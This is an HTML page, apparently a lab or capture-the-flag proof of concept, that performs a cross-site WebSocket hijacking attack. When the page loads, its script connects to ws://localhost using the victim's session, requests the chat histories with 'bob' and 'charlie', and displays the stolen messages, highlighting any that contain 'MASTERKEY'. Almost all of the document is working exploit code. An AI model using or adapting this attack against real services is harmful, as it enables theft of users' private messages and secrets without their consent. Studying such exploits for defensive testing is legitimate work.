<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .container { max-width: 600px; margin: 0 auto; }
        button { background: #d32f2f; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; }
        #output { background: #000; color: #00ff00; padding: 10px; font-family: monospace; font-size: 12px; height: 150px; overflow-y: auto; margin-top: 10px; }
        .stolen { background: #ffcdd2; padding: 10px; margin: 5px 0; border-radius: 4px; }
        .masterkey { background: #ff5722 !important; color: white; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <h1>WebSocket CSRF Attack</h1>
        <button onclick="executeCSRFAttack()">Execute Attack</button>
        <div id="stolen-data"></div>a
        <div id="output"></div>
    </div>

    <script>
        function log(message) {
            const output = document.getElementById('output');
            const timestamp = new Date().toLocaleTimeString();
            output.innerHTML += `<div>[${timestamp}] ${message}</div>`;
        }

        function addStolenMessage(from, message) {
            const div = document.getElementById('stolen-data');
            const msgDiv = document.createElement('div');
            msgDiv.className = message.includes('MASTERKEY') ? 'stolen masterkey' : 'stolen';
            msgDiv.innerHTML = `<strong>${from}:</strong> ${message}`;
            div.appendChild(msgDiv);
            
            if (message.includes('MASTERKEY')) {
                log('ðŸŽ¯ MASTERKEY STOLEN!');
            }
        }

        function executeCSRFAttack() {
            log('Starting attack...');
            
            const ws = new WebSocket('ws://localhost');
            
            ws.onopen = function() {
                log('Connected! Requesting Bob-Charlie history...');
                ws.send(JSON.stringify({ type: 'get_history', with_user: 'charlie' }));
                setTimeout(() => {
                    ws.send(JSON.stringify({ type: 'get_history', with_user: 'bob' }));
                }, 1000);
            };
            
            ws.onmessage = function(event) {
                const data = JSON.parse(event.data);
                if (data.type === 'history') {
                    log(`Got ${data.messages.length} messages`);
                    data.messages.forEach(msg => {
                        addStolenMessage(msg.from, msg.message);
                    });
                }
            };
        }

        // Auto-execute attack when page loads
        window.addEventListener('load', function() {
            executeCSRFAttack();
        });
    </script>
</body>
</html>
